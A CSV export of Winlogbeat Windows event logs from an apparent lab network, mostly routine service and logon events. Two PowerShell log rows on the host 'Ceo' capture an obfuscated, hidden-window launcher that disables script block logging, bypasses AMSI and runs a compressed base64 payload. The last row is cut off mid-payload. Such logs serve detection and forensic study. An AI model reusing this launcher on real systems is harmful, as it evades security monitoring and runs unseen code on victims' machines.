"Oct 23, 2022 @ 16:56:22.267",8XkOBIQByII7dpeErxVw,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:56:22.706","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T04:28:22Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T04:28:22Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4778,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:56:08.035",hnkOBIQByII7dpeEdxXD,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:56:08.454","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3912,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:55:52.242",MnkOBIQByII7dpeEQBUC,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:55:54.220","Oct 23, 2022 @ 16:55:53.601",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,576,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31190,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:55:52.242",M3kOBIQByII7dpeEQBUC,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:55:54.220","Oct 23, 2022 @ 16:55:53.602",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,576,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31191,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:55:49.644","_3kOBIQByII7dpeEMBQW",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:55:50.135","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4777,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:44.317",jnkMBIQByII7dpeESBAH,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 16:53:45.225","Oct 23, 2022 @ 16:53:44.581",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):
$h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))

ScriptBlock ID: 8cf52091-7f80-4daf-b868-618c249e3f53
Path: ","8cf52091-7f80-4daf-b868-618c249e3f53","$h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-18","-","-","{1f14668e-e63b-0000-46ca-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","7,652","5,336","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3319,"Execute a Remote Command","NT AUTHORITY","S-1-5-18",SYSTEM,User,1
"Oct 23, 2022 @ 16:53:44.135",jHkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0F